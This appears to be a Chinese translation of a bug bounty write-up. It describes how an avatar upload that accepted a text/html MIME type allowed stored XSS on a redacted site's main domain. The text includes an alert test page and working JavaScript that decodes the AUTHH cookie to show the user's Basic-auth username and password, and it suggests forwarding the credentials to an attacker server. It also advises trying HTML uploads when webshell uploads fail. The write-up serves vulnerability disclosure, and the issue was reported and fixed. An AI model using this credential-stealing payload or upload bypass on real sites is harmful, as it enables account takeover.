**![capture_853651.png](https://image.3001.net/images/20200527/1590572783_5ece36ef2c5eb.png!small)**

**本文中，作者在测试某Web目标站点APP的过程中，通过其中的用户头像上传功能，可以成功上传并加载HTML文件，进步利用该HTML文件可以形成存储型XSS攻击，读取用户的密码信息。我们一起来看看其利用姿势。**

## 漏洞发现

当我注册登录了目标站点APP之后，经过对用户设置项的检查后发现，其中存在一个用户头像上传功能，如下：

![image-3-1.png](https://image.3001.net/images/20200527/1590572612_5ece364412e7b.png!small)于是，我就用Burp对该上传功能进行抓包分析：

![image-4.png](https://image.3001.net/images/20200527/1590572630_5ece36561e51c.png!small)

请注意，这里我用到了PATCH请求操作，可见其中的ProfilePicture参数为一串base64编码的图像化字串，另外，之前的ProfilePictureMIME参数为image/png，此处是我测试修改后的截图。

该请求是一个图片数据的上传操作，会对上传图像执行一个base64编码，然后通过JSON形式的结构上传到相应的API接口中去。我尝试着把ProfilePictureMIME参数值更改为text/x-php和application/php后，上传都被无效处理，但把其更改为text/html后竟然被允许了，接着，我就随手写了个包含alert动作的html文件进行上传：

    
    
    <!DOCTYPE html>
    
    <html>
    
    <body>
    
    <h1>Test</h1>
    
    </body>
    
    <script>
    
    alert(1);
    
    </script>
    
    </html>

之后，把该html文件经base64编码，替换掉原先的ProfilePicture参数值，然后更改ProfilePictureMIME参数值为text/html，提交上传。接下来，我在浏览器中访问我的头像文件，哦，可以成功加载上传后的html文件！但遗憾的是，测试过程中在这里我未作截图。``

由于服务器对这种用户头像图片无需任何访问权限限定，且Web目标站点存储用户头像图片的链接与主站域名相同，如下：

>
> 用户头像图片链接：<https://something.redacted.com/res/img/usermeta//551/USER_7025dffcf32e4097bebe7b530f9f1a5d.png?ts=1584857339>
>
> Web目标站点域名：<https://something.redacted.com/>
>
> Web目标站点登录链接：<https://something.redacted.com/login/>

也就是说，即使在我当前的登录账户之内，也可以访问到上述链接的其他用户头像图片。由此我想到了一个攻击场景，即在登录账户之后，看看能否有可利用的Cookie信息，恰巧在其Cookie中发现了一个名为AUTHH的经base64编码的参数，后经比对发现，其与Authorization
Header首部中的Cookie信息一致。由于该Web应用采用了HTTP Basic
Authentication认证，虽然其中的密码是base64编码，但经简单的转码后，就是可见的了。

> Cookie: AUTHH=QmFzaWMgWm1GclpUcG1ZV3RsY0dGemN3PT0=

所以，我就构造出以下包含读取用户密码信息的HTML文件进行上传：

    
    
    <html>
    
    <head>
    
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    
    <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
    
    </head>
    
    <body>
    
    <h1>Password Display by bad5ect0r</h1>
    
    <p>Your username is: < id="uname"></></p>
    
    <p>Your password is: < id="pass"></></p>
    
    </body>
    
    <script>
    
    $(document).ready(function () {
    
    const AUTHH = Cookies.get('AUTHH');
    
    const unb64 = atob(AUTHH);
    
    const basic = unb64.split(' ');
    
    const uname_pass = atob(basic[1]).split(':');
    
    const user = uname_pass[0];
    
    const pass = uname_pass[1];
    
    $('#uname').html(user);
    
    $('#pass').html(pass);
    
    });
    
    </script>
    
    </html>

该HTML文件可以转码用户Cookie中的AUTHH信息，从而明文显示出用户名密码。当然攻击者也可以在其中内置用户密码转发操作，把获取到的密码信息转发到他们控制的服务端中。该HTML成功加载后的效果如下：

![image-5.png](https://image.3001.net/images/20200527/1590572702_5ece369e9bea6.png!small)之后我立即向厂商上报了漏洞，他们也及时地进行了修复。我的经验是：如果在测试上传功能的时候，无法有效上传Webshell，那就尝试上传一个HTML文件试试。

 ***参考来源：[bad5ect0r](https://www.bad5ect0r.sh/index.php/2020/05/17/stored-xss-password-disclosure/)，clouds 编译整理，转载请注明来自 FreeBuf.COM**  

